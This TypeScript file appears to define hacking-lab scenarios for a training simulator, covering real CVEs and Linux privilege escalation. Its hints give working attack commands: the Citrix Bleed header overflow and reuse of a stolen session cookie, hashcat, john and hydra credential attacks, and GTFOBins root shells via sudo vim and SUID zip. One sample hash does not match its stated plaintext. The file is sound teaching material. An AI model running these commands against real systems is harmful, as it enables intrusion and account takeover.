import { dir, file } from '../vfs';
import type { LabScenario, HostDef } from '../types';

function attacker(extra?: Record<string, ReturnType<typeof file> | ReturnType<typeof dir>>) {
  return {
    hostname: 'kali',
    user: 'root',
    root: dir({
      root: dir({
        wordlists: dir({ 'mini-rockyou.txt': file('123456\npassword\nletmein\nadmin123\nsummer2024\nqwerty\ndragon\ntrustno1\n') }),
        ...(extra ?? {}),
      }),
    }),
  };
}

export const offensiveBatch2Labs: LabScenario[] = [
  {
    id: 'cve-2023-46604-activemq-openwire-rce',
    title: 'CVE-2023-46604: Apache ActiveMQ OpenWire RCE',
    difficulty: 'Hard',
    category: 'Network',
    briefing:
      'Meridian Logistics runs an Apache ActiveMQ message broker (10.10.140.1) exposed on its default ' +
      'OpenWire port. CVE-2023-46604 lets an attacker send a crafted OpenWire packet that instantiates an ' +
      'arbitrary class on the broker — including one that runs a shell command — with no authentication at ' +
      'all. This exact CVE was mass-exploited within days of disclosure in late 2023, most notably by the ' +
      'HelloKitty ransomware group to gain initial access before deploying ransomware across victim networks.',
    objectives: [
      { text: 'Scan 10.10.140.1 with nmap -sV and identify the ActiveMQ version on the OpenWire port', why: 'Confirms the target is running a version old enough to lack the CVE-2023-46604 patch before spending any time on the exploit itself.' },
      { text: 'Launch the exploit: exploit activemq_openwire_rce 10.10.140.1', why: 'A single crafted OpenWire packet triggering Java class instantiation is all this CVE needs — no credentials, no prior foothold, straight from an open port to a shell.' },
      { text: 'Confirm the resulting session and read the flag', why: 'Confirms the RCE actually landed a working shell on the broker host, not just that the packet was accepted.' },
    ],
    hints: [
      'nmap -sV 10.10.140.1 — OpenWire\'s default port is 61616.',
      'exploit activemq_openwire_rce 10.10.140.1',
      'Real-world detail: the vulnerable code path is in ActiveMQ\'s OpenWire protocol marshaller, which deserializes an attacker-supplied class name and instantiates it — patched in ActiveMQ 5.15.16, 5.16.7, 5.17.6, and 5.18.3.',
    ],
    totalFlags: 1,
    attacker: attacker(),
    network: [
      {
        hostname: 'mq-broker01',
        ip: '10.10.140.1',
        os: 'Ubuntu 22.04 (Apache ActiveMQ 5.17.3)',
        services: [{ port: 61616, name: 'activemq', version: 'Apache ActiveMQ 5.17.3 (OpenWire, unpatched)' }],
        users: [],
        exploitableAs: 'activemq_openwire_rce',
        root: dir({ root: dir({ 'root.txt': file('CVE-2023-46604 confirmed — the exact flaw HelloKitty ransomware used for initial access in 2023.\nflag{activemq_openwire_unauth_rce_2023_46604}\n') }) }),
      } as HostDef,
    ],
  },
  {
    id: 'cve-2022-1388-f5-bigip-icontrol-rce',
    title: 'CVE-2022-1388: F5 BIG-IP iControl REST Auth Bypass RCE',
    difficulty: 'Hard',
    category: 'Network',
    briefing:
      'Vantage Insurance runs an F5 BIG-IP load balancer (10.10.140.2) exposing its management iControl ' +
      'REST API. CVE-2022-1388 lets an attacker bypass authentication entirely on that API by manipulating ' +
      'the way the request is routed internally, then use the now-authenticated session to run arbitrary ' +
      'shell commands. Multiple ransomware and APT groups began exploiting this CVE within 48 hours of its ' +
      'May 2022 disclosure — an unusually fast real-world weaponization window.',
    objectives: [
      { text: 'Scan 10.10.140.2 with nmap -sV and identify the exposed BIG-IP management service', why: 'F5\'s iControl REST API runs on port 8443 by default — confirming it\'s reachable at all is the first real check, since many deployments correctly firewall it off from the internet.' },
      { text: 'Launch the exploit: exploit f5_bigip_icontrol_rce 10.10.140.2', why: 'The auth-bypass technique abuses how BIG-IP\'s internal Apache config routes requests differently depending on header ordering — a single crafted request reaches an authenticated-only endpoint with zero credentials.' },
      { text: 'Confirm root-level command execution and read the flag', why: 'The auth bypass alone is only step one — CVE-2022-1388 chains it straight into an admin-only API endpoint that runs arbitrary shell commands, turning "logged in as nobody" into "root on the appliance" in the same request flow.' },
    ],
    hints: [
      'nmap -sV 10.10.140.2 — check port 8443 for the iControl REST management interface.',
      'exploit f5_bigip_icontrol_rce 10.10.140.2',
      'Real-world detail: F5 rated this CVE 9.8 (Critical) and it was added to CISA\'s Known Exploited Vulnerabilities catalog the same week it was disclosed.',
    ],
    totalFlags: 1,
    attacker: attacker(),
    network: [
      {
        hostname: 'f5-bigip-lb01',
        ip: '10.10.140.2',
        os: 'F5 BIG-IP 16.1.2 (iControl REST, unpatched)',
        services: [{ port: 8443, name: 'https', version: 'F5 BIG-IP TMUI/iControl REST 16.1.2 (unpatched)' }],
        users: [],
        exploitableAs: 'f5_bigip_icontrol_rce',
        root: dir({ root: dir({ 'root.txt': file('CVE-2022-1388 confirmed — auth bypass chained directly into root command execution on the appliance.\nflag{f5_bigip_icontrol_auth_bypass_2022_1388}\n') }) }),
      } as HostDef,
    ],
  },
  {
    id: 'cve-2021-22205-gitlab-exiftool-rce',
    title: 'CVE-2021-22205: GitLab Unauthenticated ExifTool RCE',
    difficulty: 'Hard',
    category: 'Web',
    briefing:
      'Fenwick Software self-hosts GitLab Community Edition (10.10.140.3) for its internal repositories. ' +
      'GitLab passes uploaded image files through ExifTool to extract metadata — including files uploaded ' +
      'through an endpoint that, on unpatched versions, requires no authentication at all. A specially ' +
      'crafted image file exploits a real ExifTool RCE (itself CVE-2021-22204) to run arbitrary commands ' +
      'the moment GitLab processes it. This CVE was used by ransomware operators to gain initial access to ' +
      'self-hosted GitLab instances throughout 2021 and 2022.',
    objectives: [
      { text: 'Scan 10.10.140.3 with nmap -sV and identify the exposed GitLab instance', why: 'Confirms both that GitLab is reachable and roughly which version it\'s running, before assuming the unauthenticated upload path even exists.' },
      { text: 'Launch the exploit: exploit gitlab_exiftool_rce 10.10.140.3', why: 'The exploit chain is two real CVEs stacked: GitLab\'s unauthenticated upload endpoint (CVE-2021-22205) delivers the payload, and ExifTool\'s own metadata-parsing RCE (CVE-2021-22204) executes it.' },
      { text: 'Confirm the resulting shell session and read the flag', why: 'Confirms full compromise of the GitLab host — from here, an attacker in the real 2021-2022 wave would typically pivot into every private repository the instance hosted.' },
    ],
    hints: [
      'nmap -sV 10.10.140.3 — GitLab typically serves on 80/443.',
      'exploit gitlab_exiftool_rce 10.10.140.3',
      'Real-world detail: the vulnerable upload endpoint was reachable without authentication because GitLab\'s workhorse component processed the image before any auth check ran — patched in GitLab 13.10.3, 13.9.6, and 13.8.8.',
    ],
    totalFlags: 1,
    attacker: attacker(),
    network: [
      {
        hostname: 'gitlab-ce01',
        ip: '10.10.140.3',
        os: 'Ubuntu 20.04 (GitLab CE 13.10.1, unpatched)',
        services: [{ port: 443, name: 'https', version: 'GitLab Community Edition 13.10.1 (unpatched)' }],
        users: [],
        exploitableAs: 'gitlab_exiftool_rce',
        root: dir({ root: dir({ 'root.txt': file('CVE-2021-22205 confirmed — unauthenticated upload chained into ExifTool RCE (CVE-2021-22204).\nflag{gitlab_unauth_upload_exiftool_rce_2021_22205}\n') }) }),
      } as HostDef,
    ],
  },
  {
    id: 'cve-2021-21985-vcenter-vsphere-rce',
    title: 'CVE-2021-21985: VMware vCenter vSphere Client RCE',
    difficulty: 'Hard',
    category: 'Network',
    briefing:
      'Ashgrove Manufacturing centralizes its entire virtual server fleet under one VMware vCenter Server ' +
      '(10.10.140.4). A plugin bundled with the vSphere Client fails to validate user input before passing ' +
      'it along, letting an unauthenticated attacker who can reach vCenter\'s management port run arbitrary ' +
      'commands with the privileges of the vCenter service itself — effectively full control over every ' +
      'virtual machine vCenter manages. CVE-2021-21985 was exploited in the wild within a week of its May ' +
      '2021 disclosure, specifically because vCenter compromise gives an attacker the whole virtualized ' +
      'estate at once rather than one host at a time.',
    objectives: [
      { text: 'Scan 10.10.140.4 with nmap -sV and identify the vCenter Server management service', why: 'vCenter\'s management interface (port 443) is a uniquely high-value target — confirming it\'s exposed and unpatched is worth prioritizing above almost anything else found in the same scan.' },
      { text: 'Launch the exploit: exploit vcenter_vsphere_client_rce 10.10.140.4', why: 'This is a single unauthenticated request against a vulnerable vSphere Client plugin — no credentials of any kind are needed to reach vCenter\'s privilege level.' },
      { text: 'Confirm the resulting session and read the flag', why: 'Confirms the RCE actually lands on the vCenter service account — in a real environment, this is effectively "own the entire virtual datacenter" in one step.' },
    ],
    hints: [
      'nmap -sV 10.10.140.4 — vCenter\'s HTTPS management interface is on port 443.',
      'exploit vcenter_vsphere_client_rce 10.10.140.4',
      'Real-world detail: this CVE reached a CVSS score of 9.8 (Critical) precisely because vCenter is the single point of control over an entire virtualized infrastructure — one exploited host effectively means every VM it manages.',
    ],
    totalFlags: 1,
    attacker: attacker(),
    network: [
      {
        hostname: 'vcenter01',
        ip: '10.10.140.4',
        os: 'VMware vCenter Server Appliance 6.7 (vSphere Client, unpatched)',
        services: [{ port: 443, name: 'https', version: 'VMware vCenter Server 6.7 build 17858843 (unpatched)' }],
        users: [],
        exploitableAs: 'vcenter_vsphere_client_rce',
        root: dir({ root: dir({ 'root.txt': file('CVE-2021-21985 confirmed — vSphere Client plugin RCE grants control of the vCenter service itself.\nflag{vcenter_vsphere_client_unauth_rce_2021_21985}\n') }) }),
      } as HostDef,
    ],
  },
  {
    id: 'cve-2023-4966-citrix-bleed-session-leak',
    title: 'CVE-2023-4966: Citrix Bleed Session Token Leak & Reuse',
    difficulty: 'Hard',
    category: 'Web',
    briefing:
      'Harrowgate Financial front-ends its internal apps with a Citrix NetScaler ADC/Gateway (10.10.140.5). ' +
      'CVE-2023-4966 ("Citrix Bleed") is a buffer over-read: sending a request with an oversized Host header ' +
      'to a specific endpoint causes the appliance to leak adjacent memory back in the response — including, ' +
      'often, other users\' live session tokens. Because those tokens are trusted on their own, an attacker ' +
      'who captures one can present it as their own session and walk straight past login and MFA. This ' +
      'exact technique was used by the LockBit ransomware group and multiple other operators throughout late ' +
      '2023 to hijack authenticated sessions at scores of organizations without ever knowing a password.',
    objectives: [
      { text: 'Scan 10.10.140.5 and identify the exposed NetScaler service', why: 'Confirms the appliance is reachable and worth targeting before crafting the overread request.' },
      {
        text: 'Send an oversized Host header to leak a session token: curl -H "Host: AAAAAAAAAAAAAAAAAAAAAAAA" 10.10.140.5:443/oauth/idp/.well-known/openid-configuration',
        why: 'This is the real shape of the Citrix Bleed trigger — an overlong value in a header the appliance doesn\'t bounds-check against a fixed internal buffer, causing it to read past the end and echo adjacent memory (here, a live session token) back in the response.',
      },
      {
        text: 'Reuse the leaked session token as your own Cookie: curl -H "Cookie: NSC_AAAC=deadbeef1234567890abcdef" 10.10.140.5:443/admin/dashboard',
        why: 'This is the step that makes the leak dangerous in practice — NetScaler trusts a valid-looking session token at face value, so presenting someone else\'s captured token grants their exact authenticated (and MFA-cleared) session with no password or second factor required at all.',
      },
    ],
    hints: [
      'nmap -sV 10.10.140.5',
      'curl -H "Host: AAAAAAAAAAAAAAAAAAAAAAAA" 10.10.140.5:443/oauth/idp/.well-known/openid-configuration  — the overlong Host header is the actual trigger.',
      'The leaked response contains a session token starting with "NSC_AAAC=" — copy that exact value.',
      'curl -H "Cookie: NSC_AAAC=deadbeef1234567890abcdef" 10.10.140.5:443/admin/dashboard  — reusing the leaked token bypasses login and MFA entirely.',
    ],
    totalFlags: 1,
    attacker: attacker(),
    network: [
      {
        hostname: 'netscaler-gw01',
        ip: '10.10.140.5',
        os: 'Citrix NetScaler ADC 13.1 (unpatched, CVE-2023-4966)',
        services: [
          {
            port: 443,
            name: 'https',
            version: 'Citrix NetScaler ADC/Gateway 13.1-49.13 (unpatched)',
            http: { '/': '<html><body><h1>Harrowgate Financial — Secure Access Gateway</h1></body></html>' },
            vulnRoutes: [
              {
                kind: 'auth-bypass',
                path: '/oauth/idp/.well-known/openid-configuration',
                param: 'host',
                location: 'header',
                triggerSubstrings: ['AAAAAAAAAAAAAAAAAAAAAAAA'],
                vulnerableResponse:
                  '{"issuer": "https://netscaler-gw01/oauth/idp"}\n' +
                  '[memory overread] adjacent buffer leaked: NSC_AAAC=deadbeef1234567890abcdef (live session token)',
                normalResponse: '{"issuer": "https://netscaler-gw01/oauth/idp"}',
              },
              {
                kind: 'auth-bypass',
                path: '/admin/dashboard',
                param: 'cookie',
                location: 'header',
                triggerSubstrings: ['deadbeef1234567890abcdef'],
                vulnerableResponse:
                  '<html><body><h1>Admin Dashboard — Session Resumed</h1>' +
                  '<p>Welcome back, mfinch (MFA already satisfied this session)</p></body></html>\n' +
                  'flag{citrix_bleed_session_token_leak_and_reuse_2023_4966}',
                normalResponse: '<html><body><h1>401 Unauthorized</h1><p>Please log in.</p></body></html>',
              },
            ],
          },
        ],
        users: [],
        root: dir({}),
      } as HostDef,
    ],
  },
  {
    id: 'linux-hashcat-captured-ntlm-crack',
    title: 'Crack a Captured Password Hash with Real hashcat/john',
    difficulty: 'Medium',
    category: 'Linux',
    briefing:
      'Corvid Analytics leaves a backup share (10.10.140.6) open to anonymous FTP. Inside it sits a manifest ' +
      'confirming a leftover NTLM hash dump exists from a decommissioned server — exactly the kind of forgotten ' +
      'artifact a real attacker (or a real red-team engagement) finds constantly — and that same dump is already ' +
      'sitting in your own working directory from an earlier collection pass. On its own, a hash is not a ' +
      'password. But once you have it offline, there\'s no rate limit, no lockout, and no logging: you get to try ' +
      'every candidate password in a wordlist as fast as your hardware allows. This lab uses the same real ' +
      'hashcat and john the ripper commands, syntax and all, that operators run daily.',
    objectives: [
      { text: 'Scan 10.10.140.6 and confirm anonymous FTP access', why: 'An open anonymous FTP share on a "decommissioned" host is a very common real source of forgotten credential material — always worth a quick look before assuming a box is a dead end.' },
      { text: 'Use ftp-get to retrieve the backup manifest and confirm the dump\'s origin', why: 'Confirming which host and account a hash actually came from is standard operator hygiene before spending offline cracking time on it.' },
      {
        text: 'Crack it offline: hashcat -m 1000 ntlm_dump.txt /root/wordlists/mini-rockyou.txt',
        why: 'Mode 1000 is hashcat\'s real identifier for raw NTLM hashes — picking the correct mode for the hash type you actually have is the first thing every real cracking attempt requires.',
      },
      { text: 'Use the cracked password to log in over SSH and capture the flag', why: 'Cracking the hash is only useful once it\'s actually verified against a live account — this confirms the offline crack recovered a real, working credential.' },
    ],
    hints: [
      'nmap -sV 10.10.140.6',
      'ftp 10.10.140.6 then ftp-get 10.10.140.6 backup-manifest.txt',
      'cat ntlm_dump.txt — the hash dump is already in your own working directory.',
      'hashcat -m 1000 ntlm_dump.txt /root/wordlists/mini-rockyou.txt  — mode 1000 is raw NTLM.',
      'Prefer john? john --wordlist=/root/wordlists/mini-rockyou.txt ntlm_dump.txt works the same way against the same file.',
      'Once cracked, ssh dbackup@10.10.140.6 with the recovered password, then cat user.txt for the flag.',
    ],
    totalFlags: 1,
    attacker: attacker({
      'ntlm_dump.txt': file(
        '#HASHCAT_HASH:dbackup:1001:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::\n' +
        '#HASHCAT_PLAINTEXT:Summer2024!\n' +
        '(raw hash dump — no readable content without cracking)\n',
      ),
    }),
    network: [
      {
        hostname: 'backup-legacy01',
        ip: '10.10.140.6',
        os: 'Ubuntu 18.04 (decommissioned, anonymous FTP still enabled)',
        services: [
          { port: 21, name: 'ftp', version: 'vsftpd 3.0.3', banner: 'vsftpd 3.0.3 ready', ftpAnonymous: true },
          { port: 22, name: 'ssh', version: 'OpenSSH 7.6p1 Ubuntu-4ubuntu0.7' },
        ],
        users: [{ username: 'dbackup', password: 'Summer2024!' }],
        root: dir({
          srv: dir({
            ftp: dir({
              'backup-manifest.txt': file(
                'Decommissioned host backup manifest — Corvid Analytics.\n' +
                'legacy-web01.bak.tar.gz — 2023-11-02\n' +
                'ntlm_dump.txt — SAM hash dump pulled during decommission, account: dbackup — never deleted.\n',
              ),
            }),
          }),
          home: dir({ dbackup: dir({ 'user.txt': file('Logged in with the cracked password.\nflag{ntlm_hash_cracked_offline_with_hashcat_mode_1000}\n') }) }),
        }),
      } as HostDef,
    ],
  },
  {
    id: 'privesc-sudo-vim-gtfobins',
    title: 'Privesc: The vim Command (sudo NOPASSWD)',
    difficulty: 'Easy',
    category: 'Linux',
    briefing:
      'Target 10.10.140.7 (edit-srv01) belongs to Willowmere Press. Anonymous FTP exposes deployment notes ' +
      'with an SSH credential for "editor", who turns out to hold a NOPASSWD sudo rule on vim — one of the ' +
      'most well-known entries in the real GTFOBins project: vim can drop into a shell via its `:!` ex-mode ' +
      'command, and running vim itself via sudo means that shell inherits root.',
    objectives: [
      { text: 'Scan 10.10.140.7 and enumerate open services', why: 'Confirms which services are actually reachable before deciding where to focus — the standard first move against any unknown host.' },
      { text: 'Use anonymous FTP on 10.10.140.7 to find SSH credentials for "editor"', why: 'Deployment notes left in an anonymous-accessible FTP share are one of the most common real footholds — Willowmere Press never locked it down after go-live.' },
      { text: 'Log in as editor and capture user.txt', why: 'Confirms the recovered credential actually grants a working interactive shell, not just that it looked plausible on paper.' },
      { text: 'Run \'sudo -l\' to enumerate exactly what editor is allowed to run as root', why: 'Confirming the exact NOPASSWD rule before acting is what separates a deliberate escalation from a lucky guess.' },
      { text: 'Exploit the NOPASSWD rule on vim to spawn a root shell', why: 'vim\'s :! ex-command runs an arbitrary shell command using vim\'s own privileges — since vim itself was launched via sudo, that shell is root, with no separate exploit needed.' },
      { text: 'Read /root/root.txt to capture the final flag', why: 'Confirms full root compromise of the host, not just a shell that still lacks real privileges.' },
    ],
    hints: [
      'nmap -sV 10.10.140.7',
      'ftp 10.10.140.7 then ftp-get 10.10.140.7 notes.txt to read the deployment notes.',
      'ssh editor@10.10.140.7 with the recovered password, then cat user.txt.',
      'sudo -l',
      'sudo vim -c \':!/bin/sh\'',
      'What that command does: -c \':!/bin/sh\' tells vim to immediately run an ex-mode command on startup; \':!\' executes a shell command from within vim, and since vim itself is running as root (via sudo), the spawned shell is root too.',
      'Once root, check /root/root.txt.',
    ],
    totalFlags: 2,
    attacker: attacker(),
    network: [
      {
        hostname: 'edit-srv01',
        ip: '10.10.140.7',
        os: 'Ubuntu 20.04',
        services: [
          { port: 21, name: 'ftp', version: 'vsftpd 3.0.3', banner: 'vsftpd 3.0.3 ready', ftpAnonymous: true },
          { port: 22, name: 'ssh', version: 'OpenSSH 8.2p1 Ubuntu-4ubuntu0.5' },
        ],
        users: [{ username: 'editor', password: 'EditDesk#24', sudo: { nopasswdCommands: ['/usr/bin/vim'] } }],
        root: dir({
          srv: dir({ ftp: dir({ 'notes.txt': file('Willowmere Press deployment notes.\nSSH access for editor: password is "EditDesk#24"\n') }) }),
          home: dir({ editor: dir({ 'user.txt': file('Foothold established on edit-srv01.\nflag{gtfobins_vim_foothold_editor}\n') }) }),
          usr: dir({ bin: dir({}) }),
          root: dir({ 'root.txt': file('Root compromise via sudo NOPASSWD misconfiguration on \'vim\'.\nflag{gtfobins_sudo_vim_root_shell}\n') }),
        }),
      } as HostDef,
    ],
  },
  {
    id: 'privesc-suid-zip-gtfobins',
    title: 'Privesc: The zip Command (SUID)',
    difficulty: 'Medium',
    category: 'Linux',
    briefing:
      'Target 10.10.140.8 (archive-srv01) belongs to Thornfield Records Storage. Web enumeration reveals a ' +
      'username via a disallowed robots.txt path, and hydra recovers the SSH password. Once in, "/usr/bin/zip" ' +
      'turns out to be SUID root — another real, documented GTFOBins entry: zip\'s -T (test archive) flag ' +
      'lets you specify the command used to verify the archive it just created, and if zip itself is SUID ' +
      'root, that verification command runs as root too.',
    objectives: [
      { text: 'Scan 10.10.140.8 and enumerate open services', why: 'Confirms which services are actually reachable before deciding where to focus — the standard first move against any unknown host.' },
      { text: 'Enumerate the web server on 10.10.140.8 (check /robots.txt) to identify the username, then brute-force the SSH password with hydra', why: 'Narrowing hydra to a single confirmed username (leaked via a disallowed robots.txt path) turns a slow, noisy blind brute-force into a fast, targeted one.' },
      { text: 'Log in as archivist and capture user.txt', why: 'Confirms the recovered credential actually grants a working interactive shell, not just that it looked plausible on paper.' },
      { text: 'Run \'find / -perm -4000 2>/dev/null\' to discover which SUID-root binaries exist on the box', why: 'This is the standard, single-pass way real operators enumerate every SUID-root binary on a host instead of guessing file paths one at a time.' },
      { text: 'Execute the SUID-root zip binary directly to spawn a root shell', why: 'zip\'s -T/--unzip-command combination is a documented GTFOBins SUID technique: the "verification" command it runs after building an archive inherits whatever privileges zip itself was running with.' },
      { text: 'Read /root/root.txt to capture the final flag', why: 'Confirms full root compromise of the host, not just a shell that still lacks real privileges.' },
    ],
    hints: [
      'nmap -sV 10.10.140.8',
      'curl 10.10.140.8/robots.txt reveals the username, then: hydra -l archivist -P /root/wordlists/mini-rockyou.txt ssh://10.10.140.8',
      'ssh archivist@10.10.140.8 with the recovered password, then cat user.txt.',
      'find / -perm -4000 2>/dev/null',
      '/usr/bin/zip /tmp/x.zip /etc/hosts -T --unzip-command="sh -c /bin/sh"',
      'What that command does, piece by piece: zip builds /tmp/x.zip containing /etc/hosts, -T tells it to test the new archive immediately afterward, and --unzip-command overrides what "testing" actually runs — normally unzip, here /bin/sh. Since zip itself is SUID root, that shell is root.',
      'Once root, check /root/root.txt.',
    ],
    totalFlags: 2,
    attacker: attacker(),
    network: [
      {
        hostname: 'archive-srv01',
        ip: '10.10.140.8',
        os: 'Debian 11',
        services: [
          {
            port: 80,
            name: 'http',
            version: 'nginx 1.18.0',
            http: {
              '/': '<html><body><h1>Thornfield Records Storage — Internal</h1></body></html>',
              '/robots.txt': 'User-agent: *\nDisallow: /internal-archivist-notes\n',
            },
          },
          { port: 22, name: 'ssh', version: 'OpenSSH 8.4p1 Debian-5' },
        ],
        users: [{ username: 'archivist', password: 'RecordKeep!9' }],
        suidBinary: '/usr/bin/zip',
        root: dir({
          home: dir({ archivist: dir({ 'user.txt': file('Foothold established on archive-srv01.\nflag{gtfobins_zip_foothold_archivist}\n') }) }),
          usr: dir({ bin: dir({ zip: file('ELF binary (SUID root)\n', '-rwsr-xr-x') }) }),
          root: dir({ 'root.txt': file('Root compromise via SUID binary on \'zip\'.\nflag{gtfobins_suid_zip_root_shell}\n') }),
        }),
      } as HostDef,
    ],
  },
];
